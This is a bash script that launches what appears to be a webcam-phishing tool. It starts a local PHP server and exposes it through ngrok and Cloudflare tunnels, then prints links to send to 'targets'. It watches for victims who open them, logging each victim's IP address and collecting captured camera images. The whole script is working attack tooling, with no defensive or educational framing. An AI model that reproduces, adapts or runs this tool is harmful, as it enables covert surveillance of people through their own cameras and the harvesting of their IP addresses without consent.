#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'
arrrr(){

arch=$(uname -m)
#supported
#aarch64
#elarm
#elx86_64
#x86_64
#elarm64


if [ "$arch" == 'aarch64' ];
then 
#echo -e "${Yellow}[${White}+${Yellow}] Dwnloading ngrok...${clear}"
#curl -L -o $HOME/.linksnow/ngrok.tgz https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz --progress-bar
#echo 
echo -e "${Yellow}[${White}+${Yellow}] Dwnloading cloudflared...${clear}"
curl -L -o $HOME/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 --progress-bar
#echo 
#echo -e "${Yellow}[${White}+${Yellow}] Dwnloading loclx...${clear}"
#curl -L -o $HOME/.linksnow/loclx.zip  https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip --progress-bar
fi

if [ "$arch" == 'arm' ];
then
#echo -e "${Yellow}[${White}+${Yellow}] Dwnloading ngrok...${clear}"
#curl -L -o $HOME/.linksnow/ngrok.tgz https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz --progress-bar
#echo 
echo -e "${Yellow}[${White}+${Yellow}] Dwnloading cloudflared...${clear}"
curl -L -o $HOME/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm --progress-bar
#echo 
#echo -e "${Yellow}[${White}+${Yellow}] Dwnloading loclx...${clear}"
#curl -L -o $HOME/.linksnow/loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip --progress-bar
fi

#---------------------------------------------------------------------------x84_64 ends
if [ "$arch" == 'x86_64' ];
then 
curl -L -o $HOME/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 --progress-bar
fi

if [ "$arch" == 'arm64' ];
then 
echo "Contact admin" 
fi
}
ddd(){
if [[ -e $HOME/cloudflared ]]; then
echo
else
echo -e "[${Green}✔${clear}] ${IYellow}Downloading cloudflared... ${clear}"
arrrr
fi
}
ddd


#--------------------------------arch ends here
catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
echo -e "[${Green}✔${clear}] ${IYellow}IP: $ip${clear}"

cat ip.txt >> saved.ip.txt
}


checkfound() {

echo -e "[${Green}✔${clear}] ${IYellow} Waiting targets [ ${Red}Press Ctrl + C to exit${clear} ]${IGreen}$ip${clear}"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
echo -e "[${Green}✔${clear}]${IGreen} Target opened the link! $ip${clear}"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
echo -e "[${Green}✔${clear}] ${IGreen}Cam file received! $ip${clear}"
mv *.png images/
rm -rf Log.log
fi
sleep 0.5
done 
}
echo clear >$HOME/.cf.log
#$HOME/cloudflared tunnel -url localhost:5555 --logfile $HOME/.cf.log > /dev/null 2>&1 &
#sleep 3
#cat $HOME/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'
php -S localhost:5555 > /dev/null 2>&1 & 
echo -e "[${Green}✔${clear}] ${IYellow}Server started confirmed... ${clear}"
sleep 07
echo -e "[${Green}✔${clear}] ${IYellow}Starting ngrok confirmed... ${clear}"
$HOME/ngrok http localhost:5555 > /dev/null 2>&1 & 
sleep 4
$HOME/cloudflared tunnel -url localhost:5555 --logfile $HOME/.cf.log > /dev/null 2>&1 &
sleep 7
cdf=$(cat $HOME/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
echo -e "[${Green}✔${clear}] ${IYellow}Ngrok script confirmed... ${clear}"
echo -e "[${Green}✔${clear}] ${IYellow}cloudflared script confirmed... ${clear}"
sleep 3
links=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"#\n"\n#g'|grep https|head -1)
echo -e "[${Green}✔${clear}] ${IYellow}Here is your Link: ${clear}"
echo -e "[${Green}✔${clear}] ${Green}─${Green}■${Green}─${Green}─😱️ ${clear}$links${clear}"
echo -e "[${Green}✔${clear}] ${Green}─${Green}■${Green}─${Green}─😱️ ${clear}$cdf${clear}"
checkfound
